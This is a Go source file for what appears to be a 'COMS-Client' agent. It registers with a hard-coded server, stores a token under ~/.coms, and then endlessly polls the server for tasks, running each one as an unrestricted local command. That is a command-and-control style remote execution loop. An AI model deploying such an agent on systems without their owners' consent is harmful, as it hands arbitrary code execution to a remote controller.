package main

import (
	inter "../COMS-Client/interaction"
	auth "../COMS-Client/auth"
	tasking "../COMS-Client/task"
	"net/http"
	"fmt"
	"net/url"
	"runtime"
	"os"
    "io/ioutil"
    "strings"
    "time"
    "os/exec"
    "encoding/json"
)

func main() {
	myUrl := "http://10.10.174.35"
	proxy := false
	OS := runtime.GOOS
	client := &http.Client{}
	home := os.Getenv("HOME") + "/"

	err := os.Mkdir(home + ".coms", 0750)

	if(proxy) {
		proxyPath := ""
		if (OS == "linux") {
			proxyPath = home + ".coms/proxy"
		} else {
			fmt.Println("NOT LINUX")
		}
	    proxyUrlByte, err := ioutil.ReadFile(proxyPath)
	    if err != nil {
	        fmt.Println("File reading error", err)
	        return
	    }
	    proxyUrlStr := string(proxyUrlByte)
	    proxyUrlStr = strings.Replace(proxyUrlStr, "\n", "", -1)
		proxyUrl, _ := url.Parse(string(proxyUrlStr))

		client = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
	}
	//fmt.Println(inter.GetHttp(myUrl, client))

    token, err := ioutil.ReadFile(home +".coms/token")
    if err != nil || string(token) == "" {
		token = []byte(auth.Register(myUrl, client))
		f, err := os.Create(home + ".coms/token")
		if err != nil {
			fmt.Println(err)
		}
		defer f.Close()
		_, err = f.Write(token)
		if err != nil {
			fmt.Println(err)
		}
	}

	connect_responce := inter.Response{}

	connect_result := inter.PutHttpToken(myUrl + "/api/connect", client, token)

	json.Unmarshal([]byte(connect_result), &connect_responce)
	fmt.Println(connect_responce.Error)

	if connect_responce.Error != "" {
		token = []byte(auth.Register(myUrl, client))
		f, err := os.OpenFile(home + ".coms/token", os.O_RDWR|os.O_TRUNC, 0750)
		if err != nil {
			fmt.Println(err)
		}
		defer f.Close()
		_, err = f.Write(token)
		if err != nil {
			fmt.Println(err)
		}
	}

	fmt.Println(string(token))
	for true {
		tasks := tasking.GetTask(myUrl, client, token).Tasks
		for _, task := range tasks {
			fmt.Println(task)
			command := strings.Fields(task.Args)[0]
			args := strings.Fields(task.Args)[1:]
			cmd := exec.Command(command, args...)
			_, err := cmd.Output()
			if err != nil {
				fmt.Println(err)
			}
		}
		time.Sleep(3 * time.Second)
	}
}